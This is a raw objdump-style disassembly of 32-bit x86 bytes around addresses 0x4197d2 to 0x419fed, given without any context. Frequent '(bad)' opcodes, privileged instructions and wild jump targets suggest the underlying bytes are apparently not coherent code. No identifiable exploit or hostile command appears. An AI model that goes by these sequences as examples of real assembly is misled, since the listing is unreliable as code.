  4197d2:	xor    esi,DWORD PTR [edx+0x3]
  4197d5:	mov    ecx,DWORD PTR [edi]
  4197d7:	fmul   DWORD PTR [edx]
  4197d9:	add    BYTE PTR [eax],al
  4197db:	lea    eax,[ebx-0x4700273c]
  4197e1:	add    al,0x4f
  4197e3:	pop    DWORD PTR [eax]
  4197e5:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4197eb:	push   edx
  4197ec:	inc    WORD PTR [ebp+0x8]
  4197f0:	mov    eax,0x514f4d
  4197f5:	(bad)
  4197f9:	add    al,al
  4197fb:	xor    DWORD PTR [ebx-0x74baf730],eax
  419801:	test   DWORD PTR [esi+0x74],esp
  419804:	inc    ebp
  419805:	mov    DWORD PTR [eax+0xa4e08],edi
  41980b:	add    BYTE PTR [ecx-0x76c435bb],cl
  419811:	or     dh,cl
  419813:	or     eax,0x8b8d5045
  419818:	inc    ebp
  419819:	mov    WORD PTR [ecx+0x3b8a00],?
  41981f:	jne    0x419854
  419821:	mov    edi,DWORD PTR [edx+0x8f3b18]
  419827:	add    DWORD PTR [ebx],eax
  419829:	add    bh,bh
  41982b:	adc    DWORD PTR [eax],ecx
  41982d:	adc    DWORD PTR [ebp+0x55],edi
  419830:	push   es
  419831:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  419837:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  41983e:	inc    ebp
  41983f:	mov    esp,edi
  419841:	or     al,0xdc
  419843:	push   eax
  419844:	(bad)  
  419845:	jne    0x4197fb
  419847:	call   0x399138
  41984c:	inc    ebp
  41984d:	sar    BYTE PTR [edx],0x84
  419850:	out    dx,al
  419851:	add    bh,al
  419853:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41985a:	(bad)  
  41985b:	and    al,al
  41985d:	fs in  eax,dx
  41985f:	inc    DWORD PTR [ebp-0x7b]
  419862:	jo     0x419873
  419864:	leave  
  419865:	scas   al,BYTE PTR es:[edi]
  419866:	inc    esp
  419867:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  41986e:	or     BYTE PTR [ebx-0x97717c9],0x83
  419875:	call   DWORD PTR [edi]
  419877:	shr    ah,0x84
  41987a:	xchg   DWORD PTR [eax],eax
  41987c:	add    DWORD PTR [eax],eax
  41987e:	add    bh,bh
  419880:	dec    ebp
  419881:	and    BYTE PTR [ecx-0x38],dl
  419884:	push   eax
  419885:	dec    DWORD PTR [ebx+0xfd885]
  41988b:	mov    BYTE PTR [ebp+0x508bac00],cl
  419891:	mov    WORD PTR [ecx+0x0],ss
  419894:	lea    ecx,[ebx+0x108b20d8]
  41989a:	mov    WORD PTR [edx],ds
  41989c:	add    BYTE PTR [edi+0xff01ff],al
  4198a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4198a5:	push   ecx
  4198a6:	shl    BYTE PTR [ebp+0x3a],0x8b
  4198aa:	inc    ebp
  4198ab:	in     al,0xeb
  4198ad:	jno    0x41983a
  4198af:	push   edx
  4198b0:	mov    DWORD PTR [eax-0x28],edx
  4198b3:	mov    eax,DWORD PTR [ebp+0x20]
  4198b6:	je     0x41983f
  4198b8:	mov    eax,DWORD PTR [ecx]
  4198ba:	sbb    BYTE PTR [eax],al
  4198bc:	pop    DWORD PTR [eax]
  4198be:	add    esi,eax
  4198c0:	add    bl,al
  4198c2:	adc    DWORD PTR [edi],esi
  4198c4:	jmp    0x8bcce916
  4198c9:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4198d0:	jne    0x41985d
  4198d2:	mov    ecx,DWORD PTR [eax]
  4198d4:	in     al,0x75
  4198d6:	pop    DWORD PTR [ecx+0x5501]
  4198dc:	push   edx
  4198dd:	inc    DWORD PTR [ebx]
  4198df:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4198e5:	add    BYTE PTR [edi+0x9],dl
  4198e8:	call   DWORD PTR [esi]
  4198ea:	and    dl,al
  4198ec:	and    bh,bh
  4198ee:	inc    edi
  4198f0:	test   eax,edx
  4198f2:	sldt   ebx
  4198f5:	xor    BYTE PTR [eax],al
  4198f7:	pushf  
  4198f8:	(bad)  
  4198f9:	jmp    0x419907
  4198fb:	mov    eax,edi
  4198fd:	or     al,0x75
  4198ff:	inc    eax
  419900:	call   0x419008
  419905:	mov    eax,eax
  419907:	loopne 0x41988d
  419909:	inc    ebp
  41990a:	add    BYTE PTR [ebx+0x1451c00],cl
  419910:	mov    eax,DWORD PTR [ebp+0x20]
  419913:	add    edi,ecx
  419915:	add    BYTE PTR [eax],ch
  419917:	cmp    edi,0x18
  41991a:	test   DWORD PTR [ebp+0xf],esi
  41991d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  419924:	jne    0x419928
  419926:	call   0xffa093eb
  41992b:	leave  
  41992c:	rcr    BYTE PTR [esp+eax*4],0x55
  419930:	add    ah,ch
  419932:	add    BYTE PTR [edi-0x48fef979],dh
  419938:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  41993f:	inc    esp
  419940:	mov    ebx,DWORD PTR [eax]
  419942:	fcom   st(2)
  419944:	add    BYTE PTR [edi],bl
  419946:	lea    ecx,[eax-0x18]
  419949:	(bad)  
  41994a:	push   DWORD PTR [ecx]
  41994c:	call   0xffb3e6ae
  419951:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  419955:	fstp   DWORD PTR [esi+ebx*8]
  419958:	push   ebp
  419959:	pop    ebp
  41995a:	mov    esi,DWORD PTR [edx-0x38]
  41995d:	add    DWORD PTR [eax],0x28
  419960:	mov    edi,DWORD PTR [ebx]
  419962:	xor    esi,DWORD PTR [edx+0x3]
  419965:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  419969:	pop    ebp
  41996a:	or     al,0x4
  41996c:	inc    ecx
  41996d:	push   ebp
  41996e:	(bad)  
  41996f:	in     al,dx
  419970:	or     ah,ch
  419972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419973:	xbegin 0xffc70f69
  419979:	clc    
  41997a:	adc    al,0x45
  41997c:	div    BYTE PTR [eax]
  41997e:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  419985:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  41998c:	jno    0x4199f4
  41998e:	add    eax,DWORD PTR [ebp+0x52]
  419991:	adc    eax,0xffffffa0
  419994:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  41999a:	test   DWORD PTR [eax],eax
  41999c:	clc    
  41999d:	data16 or al,BYTE PTR [ebp+0x45]
  4199a1:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4199a8:	rol    BYTE PTR [ebp+0x45],1
  4199ab:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4199b1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4199b7:	push   ebx
  4199b8:	add    BYTE PTR [ebp+0x0],dl
  4199bb:	push   ecx
  4199bc:	jge    0x4199f1
  4199be:	add    BYTE PTR [esi+0x4],dl
  4199c1:	jne    0x419a28
  4199c3:	mov    edx,0x457200
  4199c8:	jmp    0x41998c
  4199ca:	xor    edi,DWORD PTR [ebx]
  4199cc:	pop    edi
  4199cd:	cvtdq2ps xmm7,xmm0
  4199d0:	ret    0x0
  4199d3:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4199d9:	xor    ecx,DWORD PTR [edi]
  4199db:	add    eax,DWORD PTR [ecx+0x3b]
  4199de:	push   ebx
  4199df:	rdpmc  
  4199e1:	out    0x8d,al
  4199e3:	add    BYTE PTR [eax],cl
  4199e5:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4199eb:	ret    0x450c
  4199ee:	sbb    al,0x8b
  4199f0:	cmp    eax,esi
  4199f2:	or     cl,al
  4199f4:	or     al,0xc2
  4199f6:	pop    eax
  4199f7:	inc    ebp
  4199f8:	add    ecx,DWORD PTR [edi]
  4199fa:	add    esi,DWORD PTR [ebp+0x39]
  4199fd:	invd   
  4199ff:	jge    0x419a0b
  419a01:	mov    eax,0x478ac0
  419a06:	cli    
  419a07:	xor    esp,ecx
  419a09:	mov    ebx,0x5b8ac0
  419a0e:	ret    0x33
  419a11:	mov    eax,0x833b8b
  419a16:	sub    BYTE PTR [ebx],al
  419a18:	inc    ebp
  419a19:	xor    ax,di
  419a1c:	pushf  
  419a1d:	inc    bh
  419a1f:	mov    esp,esp
  419a21:	hlt    
  419a22:	test   DWORD PTR [ebp-0x8],esi
  419a25:	mov    eax,DWORD PTR [ebp-0x14]
  419a28:	xor    ecx,DWORD PTR [ebx-0x76478864]
  419a2e:	dec    edi
  419a2f:	or     BYTE PTR [eax],al
  419a31:	jne    0x4199bc
  419a33:	mov    esi,esp
  419a35:	call   0x77a825fa
  419a3a:	inc    ebp
  419a3b:	mov    DWORD PTR [eax+0x9c4f0c],edi
  419a41:	add    BYTE PTR [ecx-0x3ffe0717],cl
  419a47:	add    BYTE PTR [esi+0x7d],ah
  419a4a:	inc    ebp
  419a4b:	mov    bx,WORD PTR [ebp+0x8]
  419a4f:	add    DWORD PTR [ebp+0x55],0x30c008b
  419a56:	inc    ebp
  419a57:	mov    bx,di
  419a5a:	lock test BYTE PTR [ecx+0x7000801],bh
  419a61:	jge    0x419a24
  419a63:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  419a69:	cli    
  419a6a:	xor    bl,bh
  419a6c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  419a72:	test   BYTE PTR [eax],cl
  419a74:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  419a7b:	cmp    ebp,eax
  419a7d:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  419a84:	test   BYTE PTR [ebp+0x1],bh
  419a87:	mov    ebx,0x458a00
  419a8c:	xor    esi,DWORD PTR [ebx]
  419a8e:	add    esp,DWORD PTR [esi-0x77]
  419a91:	pop    ebp
  419a92:	loopne 0x419afa
  419a94:	inc    ebp
  419a95:	clc    
  419a96:	xor    edi,DWORD PTR [ebx]
  419a98:	add    esi,DWORD PTR [edx-0x77]
  419a9b:	data16 fdivr QWORD PTR [ebp-0x49]
  419a9f:	mov    ebx,0xb78afc
  419aa4:	hlt    
  419aa5:	xor    edi,DWORD PTR [esi]
  419aa7:	data16 add BYTE PTR [ebp+0x66],bl
  419aab:	data16 lock clc 
  419aae:	cmp    eax,DWORD PTR ds:[eax]
  419ab1:	ja     0x419b19
  419ab3:	psubq  mm7,QWORD PTR [ebp+0x4]
  419ab7:	ltr    WORD PTR [ebp+0x66]
  419abb:	add    esi,eax
  419abd:	add    di,WORD PTR [ebp+0x2b]
  419ac1:	data16 data16 jge 0x419b42
  419ac5:	mov    ebx,0xe08a8b
  419aca:	jge    0x419aff
  419acc:	data16 data16 xor al,0x5d
  419ad0:	data16 data16 jne 0x419acc
  419ad4:	mov    edi,DWORD PTR [ebx]
  419ad6:	fdiv   QWORD PTR [edx+0x7d]
  419ad9:	data16 data16 jge 0x419b11
  419add:	mov    ebx,0x758a66
  419ae2:	mov    esi,0x667233
  419ae7:	pop    ebp
  419ae8:	or     BYTE PTR [esi+0x0],ah
  419aeb:	clc    
  419aec:	mov    edi,DWORD PTR [ebx]
  419aee:	lock ja 0x419a7c
  419af1:	(bad)  
  419af3:	jge    0x419aec
  419af5:	invd   
  419af7:	pop    ebp
  419af8:	add    BYTE PTR [ebx],al
  419afa:	(bad)  
  419afb:	cmp    di,WORD PTR [ebp+0xf]
  419aff:	data16 sbb bh,BYTE PTR [ebp+0x0]
  419b03:	mov    bx,WORD PTR [ebp-0x10]
  419b07:	pop    bp
  419b09:	fbstp  TBYTE PTR [ebx]
  419b0b:	test   DWORD PTR [ebx],eax
  419b0d:	add    BYTE PTR [ebx],bh
  419b0f:	add    BYTE PTR [esi+0x7d],ah
  419b12:	jge    0x419a9f
  419b14:	data16 in al,dx
  419b16:	pop    ebp
  419b17:	stc    
  419b18:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  419b1f:	mov    edi,ebx
  419b21:	in     al,dx
  419b22:	test   BYTE PTR [ebp+0x0],bh
  419b25:	mov    eax,DWORD PTR [eax]
  419b27:	call   0xbd3e94b7
  419b2c:	ds pushf 
  419b2e:	add    BYTE PTR [edx],dh
  419b30:	mov    bx,di
  419b33:	call   0x8b4a18c3
  419b38:	add    ebp,esp
  419b3a:	mov    bx,di
  419b3d:	jnp    0x419b65
  419b3f:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  419b45:	mov    eax,DWORD PTR [eax]
  419b47:	call   0x7c3d26b2
  419b4c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  419b52:	data16 data16 fistp WORD PTR [ebp+0xe]
  419b57:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  419b61:	fisttp WORD PTR [ecx-0x7401f77b]
  419b67:	(bad)  
  419b68:	cld    
  419b69:	jne    0x419ba9
  419b6b:	xor    eax,DWORD PTR [eax]
  419b6d:	mov    esp,DWORD PTR [esi-0x10]
  419b70:	sti    
  419b71:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  419b78:	data16 adc bl,bh
  419b7b:	push   ebp
  419b7c:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  419b83:	mov    WORD PTR [eax],es
  419b85:	pushf  
  419b86:	data16 xor bh,bl
  419b89:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  419b8f:	mov    esp,DWORD PTR [esi-0x14]
  419b92:	fisttp WORD PTR [ebx-0x3748a9f2]
  419b98:	or     al,0x2b
  419b9a:	mov    bh,0xba
  419b9c:	hlt    
  419b9d:	mov    bh,bl
  419b9f:	add    BYTE PTR [ecx-0x7446f3cd],cl
  419ba5:	dec    esi
  419ba6:	or     al,0x0
  419ba8:	mov    edi,DWORD PTR [ebx]
  419baa:	or     BYTE PTR [ebp+0x3b],dh
  419bad:	mov    ecx,DWORD PTR [edi]
  419baf:	fdivr  QWORD PTR [ebx-0x7499ff83]
  419bb5:	xor    al,0xd8
  419bb7:	pop    bp
  419bb9:	lock xor esi,DWORD PTR [ebx]
  419bbc:	lea    esp,[esi+0x1f]
  419bbf:	icebp  
  419bc0:	jb     0x419bc6
  419bc2:	add    al,al
  419bc4:	jge    0x419bd2
  419bc6:	mov    eax,eax
  419bc8:	fsubr  st,st(3)
  419bca:	pop    ebp
  419bcb:	mov    esi,DWORD PTR [ebx]
  419bcd:	in     al,0x8d
  419bcf:	rcr    DWORD PTR [edi],0xc2
  419bd2:	jb     0x419c32
  419bd4:	add    cl,cl
  419bd6:	jge    0x419be4
  419bd8:	mov    edx,DWORD PTR [ebp-0x20]
  419bdb:	in     al,dx
  419bdc:	pop    ebp
  419bdd:	data16 data16 or BYTE PTR [esi+edi*4],bh
  419be2:	cmp    di,WORD PTR [ebp+0x0]
  419be6:	mov    ebp,DWORD PTR [ebx]
  419be8:	fdivr  QWORD PTR [esi+0x668a5d]
  419bee:	cmp    al,0x33
  419bf0:	mov    si,0x4e7d
  419bf4:	mov    eax,DWORD PTR [eax]
  419bf6:	lock inc ebp
  419bf8:	mov    esi,DWORD PTR [esi]
  419bfa:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  419c01:	clc    
  419c02:	(bad)  
  419c03:	cmp    edi,DWORD PTR [ebx]
  419c05:	je     0x419c16
  419c07:	push   ebx
  419c08:	loopne 0x419c19
  419c0a:	dec    ecx
  419c0c:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  419c10:	icebp  
  419c11:	mov    esi,0x703084d
  419c16:	pcmpgtd mm6,mm1
  419c19:	add    BYTE PTR [ebp+0x66],dh
  419c1c:	jmp    0x419be9
  419c1e:	mov    eax,DWORD PTR [ebx]
  419c20:	lock push ebp
  419c22:	ror    DWORD PTR [ebp-0x2972feb3],1
  419c28:	or     bh,dl
  419c2a:	jb     0x419c2a
  419c2c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  419c32:	loopne 0x419c34
  419c34:	jne    0x419c3a
  419c36:	data16 add BYTE PTR [esi+eiz*2],dh
  419c3a:	mov    ecx,ebx
  419c3c:	data16 ds icebp 
  419c3f:	add    BYTE PTR [esi],bh
  419c41:	data16 add bl,cl
  419c44:	retw   0xf2
  419c48:	ret    0x66
  419c4b:	retf   
  419c4c:	enterw 0x4df1,0x19
  419c51:	pop    edi
  419c52:	jne    0x419bd5
  419c54:	mov    esi,DWORD PTR [esi]
  419c56:	call   0x77b627f7
  419c5b:	xor    ebp,DWORD PTR [ebx]
  419c5d:	lea    esp,[esi+0x48]
  419c60:	repnz in eax,0x3b
  419c63:	add    BYTE PTR [ebp-0x37],dh
  419c66:	xor    edx,DWORD PTR [ebp-0x15]
  419c69:	in     al,dx
  419c6a:	xor    edx,DWORD PTR [esi+0x40]
  419c6d:	mov    DWORD PTR [edi],0x338545fc
  419c73:	clc    
  419c74:	add    esi,DWORD PTR [ecx]
  419c76:	pop    edi
  419c77:	pushf  
  419c78:	pop    ebx
  419c79:	call   0xff429c40
  419c7e:	mov    edi,eax
  419c80:	push   ecx
  419c81:	pop    es
  419c82:	mov    esi,DWORD PTR [edi]
  419c84:	push   esi
  419c85:	inc    edi
  419c86:	add    al,0x70
  419c88:	add    BYTE PTR [ecx+0x66],ah
  419c8b:	(bad)  
  419c8c:	into   
  419c8d:	fs ds int 0x0
  419c91:	mov    ecx,0x7ce0866
  419c96:	ret    0x66
  419c99:	add    bh,al
  419c9b:	add    al,0xfc
  419c9d:	add    BYTE PTR [ebp+0x31c3f866],al
  419ca3:	ds pushf 
  419ca5:	add    BYTE PTR [esi+0x66],ah
  419ca8:	into   
  419ca9:	ret    
  419caa:	pop    ebp
  419cab:	adc    al,0x57
  419cad:	add    BYTE PTR [edi-0x723c409a],dh
  419cb3:	add    edi,edi
  419cb5:	jne    0x419d0c
  419cb7:	lea    edx,[ecx+0x1]
  419cba:	mov    ebx,0xd64ff1
  419cbf:	sar    DWORD PTR [ebx],1
  419cc1:	test   BYTE PTR [ebp+0x38],dh
  419cc4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  419cc8:	push   edi
  419cc9:	xor    BYTE PTR [ebx],0x37
  419ccc:	mov    esi,ebx
  419cce:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  419cd4:	cmp    BYTE PTR [ebp+0x64],al
  419cd7:	pop    ebx
  419cd8:	mov    ebx,0x9c3b36
  419cdd:	je     0x419d0a
  419cdf:	xor    edi,DWORD PTR [ebx+0x668a33]
  419ce5:	mov    WORD PTR [ebx],?
  419ce7:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  419ced:	pop    edi
  419cee:	cmp    ecx,ecx
  419cf0:	jne    0x419d47
  419cf2:	mov    ebp,esp
  419cf4:	cld    
  419cf5:	push   esi
  419cf6:	pop    ebx
  419cf7:	inc    ebp
  419cf8:	stc    
  419cf9:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  419d01:	clc    
  419d02:	test   dl,dl
  419d04:	cmp    bh,bh
  419d06:	fs pop si
  419d09:	or     bl,al
  419d0b:	add    al,0x8b
  419d0d:	add    BYTE PTR [ecx+0x66],dl
  419d10:	push   edi
  419d11:	retf   0x3e45
  419d14:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  419d1c:	clc    
  419d1d:	add    BYTE PTR [ebx+0x66],bl
  419d20:	dec    edx
  419d22:	mov    edx,DWORD PTR [edi-0x76]
  419d25:	push   edi
  419d26:	add    al,0xb7
  419d28:	xor    al,0xba
  419d2a:	cmp    al,0x8d
  419d2c:	je     0x419d2d
  419d2e:	mov    edx,DWORD PTR [ebp-0x46]
  419d31:	push   ecx
  419d32:	lea    edi,[ebx+0x554fff]
  419d38:	push   ecx
  419d39:	cmp    edx,DWORD PTR [ebx+0x75]
  419d3c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  419d42:	add    BYTE PTR [ebx],dh
  419d44:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  419d4a:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  419d51:	mov    ebx,0x3b3b00
  419d56:	jne    0x419d83
  419d58:	mov    DWORD PTR [ebx+0x728afc],edi
  419d5e:	xor    esi,DWORD PTR [ebx]
  419d60:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  419d66:	push   edi
  419d67:	cmp    esp,ebp
  419d69:	jne    0x419d6b
  419d6b:	sbb    DWORD PTR [eax],0x8085c3fc
  419d71:	clc    
  419d72:	inc    edi
  419d73:	pop    ebx
  419d74:	sti    
  419d75:	add    eax,0xeb8bc075
  419d7a:	cld    
  419d7b:	xor    edi,DWORD PTR ds:0xf8c3855e
  419d81:	mov    ecx,DWORD PTR [ecx+edx*2]
  419d84:	rol    DWORD PTR [ebp-0x37],0xf
  419d88:	mov    DWORD PTR [eax],ecx
  419d8a:	inc    edi
  419d8b:	(bad)  
  419d8c:	in     eax,0xfc
  419d8e:	add    bh,bh
  419d90:	(bad)  
  419d91:	mov    esi,0xc38a5e
  419d96:	mov    esi,DWORD PTR [ebx]
  419d98:	push   ecx
  419d99:	mov    edi,0xfc4ec7
  419d9e:	test   DWORD PTR [ebp-0x8],edx
  419da1:	xor    di,ax
  419da4:	pushf  
  419da5:	sub    ebp,eax
  419da7:	inc    ebp
  419da8:	(bad)  
  419da9:	sub    edi,edi
  419dab:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  419db1:	inc    ebp
  419db2:	add    BYTE PTR [esi+0x2b],ah
  419db5:	or     bh,BYTE PTR [edx+0xf8ac2]
  419dbb:	cmp    al,0x33
  419dbd:	mov    edi,DWORD PTR [edx+0xfc4e81]
  419dc3:	(bad)  
  419dc4:	cmp    esi,DWORD PTR [ebx]
  419dc6:	je     0x419d80
  419dc8:	push   ebx
  419dc9:	dec    esi
  419dca:	str    ecx
  419dcd:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  419dd1:	xor    edi,DWORD PTR [edi+0x789085f]
  419dd7:	mov    edx,DWORD PTR [esp+edi*8]
  419dda:	add    cl,cl
  419ddc:	data16 add al,0xcb
  419ddf:	push   ebp
  419de0:	add    ebp,esp
  419de2:	jne    0x419dd0
  419de4:	(bad)  
  419de5:	mov    DWORD PTR [ecx],0xd685f7ec
  419deb:	clc    
  419dec:	xlat   BYTE PTR ds:[ebx]
  419ded:	inc    ebp
  419dee:	mov    esi,DWORD PTR [eax]
  419df0:	push   eax
  419df1:	pushf  
  419df2:	in     eax,0x8b
  419df4:	add    ah,ch
  419df6:	add    al,0x55
  419df8:	add    BYTE PTR [ecx+0x66],dl
  419dfb:	add    eax,0x3e72cb
  419e00:	add    BYTE PTR [ebp+0x66],al
  419e03:	(bad)  
  419e04:	retf   
  419e05:	lock ret 0x85
  419e09:	clc    
  419e0a:	inc    bp
  419e0c:	retf   
  419e0d:	cmp    eax,0xc77d9cc8
  419e12:	ss cld 
  419e14:	pushf  
  419e15:	test   DWORD PTR [edi-0x8],ebx
  419e18:	je     0x419e5f
  419e1a:	xor    esi,DWORD PTR ds:0x7020840
  419e20:	ror    BYTE PTR [ebp-0x37],0x8d
  419e24:	push   ebp
  419e25:	add    esp,ebp
  419e27:	jb     0x419db4
  419e29:	add    BYTE PTR [eax],cl
  419e2b:	dec    ebp
  419e2c:	mov    bh,0x81
  419e2e:	push   esi
  419e2f:	push   ebp
  419e30:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  419e37:	xor    al,BYTE PTR [eax]
  419e39:	mov    edx,DWORD PTR [edi+0x10]
  419e3c:	(bad)  
  419e3d:	scas   eax,DWORD PTR es:[edi]
  419e3e:	ret    0x3b
  419e41:	jns    0x3b429b34
  419e47:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  419e4b:	dec    ebp
  419e4c:	or     BYTE PTR [ebx],ch
  419e4e:	ret    0x458b
  419e51:	lock jmp 0x419e45
  419e54:	mov    ecx,DWORD PTR [eax]
  419e56:	or     BYTE PTR [edi],al
  419e58:	mov    ecx,eax
  419e5a:	xor    DWORD PTR [edx+0x2],0x0
  419e5e:	mov    bh,0xc1
  419e60:	adc    BYTE PTR [eax],dh
  419e62:	iret   
  419e63:	inc    ebp
  419e64:	mov    DWORD PTR [ebx],0x4dfff8c4
  419e6a:	inc    BYTE PTR [ebx]
  419e6c:	ret    0xf8
  419e6f:	adc    DWORD PTR [esi+0x10],esp
  419e72:	clc    
  419e73:	dec    ecx
  419e74:	fisttp WORD PTR [ecx+0x456604c0]
  419e7a:	add    dh,BYTE PTR ds:0x75e0845
  419e80:	ret    0x4d
  419e83:	lea    ecx,[ebx+0x18728301]
  419e89:	add    BYTE PTR [ebp+0x45],al
  419e8c:	xor    ecx,ebp
  419e8e:	pushf  
  419e8f:	add    bh,al
  419e91:	add    al,ch
  419e93:	inc    ebp
  419e94:	test   DWORD PTR [ebx-0x3eba0708],ecx
  419e9a:	xor    eax,0x781084d
  419e9f:	push   ebp
  419ea0:	pushf  
  419ea1:	push   ecx
  419ea2:	xor    al,BYTE PTR [ecx+0x32f89c89]
  419ea8:	inc    ebp
  419ea9:	cmp    edi,DWORD PTR [ecx]
  419eab:	jbe    0x419e49
  419ead:	mov    eax,edi
  419eaf:	or     ah,dh
  419eb1:	inc    ebp
  419eb2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  419eb8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  419ebe:	in     al,dx
  419ebf:	hlt    
  419ec0:	push   ebp
  419ec1:	push   ebp
  419ec2:	push   ecx
  419ec3:	push   ecx
  419ec4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  419eca:	pushf  
  419ecb:	pushf  
  419ecc:	xor    dh,BYTE PTR [edx]
  419ece:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  419ed4:	or     BYTE PTR [ebp+0x7],al
  419ed7:	mov    eax,ecx
  419ed9:	clc    
  419eda:	jb     0x419e9d
  419edc:	add    BYTE PTR [ebp+0x55],cl
  419edf:	or     DWORD PTR [edi],0xc251d155
  419ee5:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  419eef:	mov    edi,eax
  419ef1:	or     cl,al
  419ef3:	inc    ebp
  419ef4:	dec    ebp
  419ef5:	mov    eax,DWORD PTR [ecx+0x514d550c]
  419efb:	or     WORD PTR [ecx],0x899c
  419f00:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  419f06:	mov    edx,DWORD PTR [ecx+0x8]
  419f09:	mov    eax,DWORD PTR [ebp-0x8]
  419f0c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  419f13:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  419f19:	inc    ebp
  419f1a:	dec    eax
  419f1b:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  419f21:	add    edx,DWORD PTR [ecx-0x8]
  419f24:	mov    ecx,DWORD PTR [ecx]
  419f26:	clc    
  419f27:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  419f2e:	mov    ecx,ebp
  419f30:	clc    
  419f31:	(bad)  
  419f32:	popf   
  419f33:	inc    DWORD PTR [eax]
  419f35:	ret    0x8b
  419f38:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  419f3e:	mov    edi,esp
  419f40:	hlt    
  419f41:	test   ecx,esi
  419f43:	clc    
  419f44:	or     BYTE PTR [ebp+0x7],al
  419f47:	xor    cl,al
  419f49:	pushf  
  419f4a:	jb     0x419f7f
  419f4c:	add    BYTE PTR [eax-0x3f],al
  419f4f:	inc    eax
  419f50:	daa    
  419f51:	inc    ebp
  419f52:	inc    ebp
  419f53:	xor    eax,0x7f80803
  419f58:	dec    ebp
  419f59:	pushf  
  419f5a:	add    esi,DWORD PTR [edx]
  419f5c:	clc    
  419f5d:	cmp    DWORD PTR [ecx],ecx
  419f5f:	or     al,0x8
  419f61:	add    al,BYTE PTR [ebp+0x2c]
  419f64:	xor    eax,0x7350845
  419f69:	or     BYTE PTR [ebp+0x7],cl
  419f6c:	lea    ebx,[ecx+eax*1+0x8b7232]
  419f73:	or     al,0x45
  419f75:	enter  0x4deb,0x8b
  419f79:	mov    edx,DWORD PTR [eax]
  419f7b:	cld    
  419f7c:	dec    ebp
  419f7d:	push   ebp
  419f7e:	sub    edx,DWORD PTR [ecx-0x75]
  419f81:	add    eax,0xf172fc
  419f86:	or     BYTE PTR [ebp+0x7],cl
  419f89:	add    eax,ecx
  419f8b:	or     al,0x72
  419f8d:	add    DWORD PTR [eax],eax
  419f8f:	mov    ebx,0x29c2c1
  419f94:	inc    ebp
  419f95:	mov    eax,DWORD PTR [ebx]
  419f97:	cmp    eax,0x3004d1c
  419f9d:	xbegin 0x66c72b97
  419fa3:	clc    
  419fa4:	or     BYTE PTR [ebp+0x45],al
  419fa7:	xor    BYTE PTR ds:0x78b089c,dh
  419fad:	adc    BYTE PTR [ebp+0x45],cl
  419fb0:	lea    eax,[ebp+0x33727501]
  419fb6:	add    cl,ch
  419fb8:	inc    ebp
  419fb9:	add    bl,ch
  419fbb:	add    BYTE PTR [ebx+0x45850845],cl
  419fc1:	je     0x419f4e
  419fc3:	push   ebx
  419fc4:	or     al,0x85
  419fc6:	dec    ebp
  419fc7:	std    
  419fc8:	mov    bh,bh
  419fca:	mov    BYTE PTR [ebp-0x75],al
  419fcd:	mov    edi,eax
  419fcf:	or     al,0x89
  419fd1:	inc    ebp
  419fd2:	clc    
  419fd3:	mov    esp,esp
  419fd5:	hlt    
  419fd6:	call   DWORD PTR [edi-0x37]
  419fd9:	push   ebp
  419fda:	or     al,0x51
  419fdc:	push   ebp
  419fdd:	xor    ebp,esp
  419fdf:	mov    esi,0x457251
  419fe4:	xor    esi,eax
  419fe6:	pushf  
  419fe7:	inc    ebp
  419fe8:	(bad)  
  419fe9:	mov    edi,eax
  419feb:	or     al,0x85
  419fed:	add    al,bh
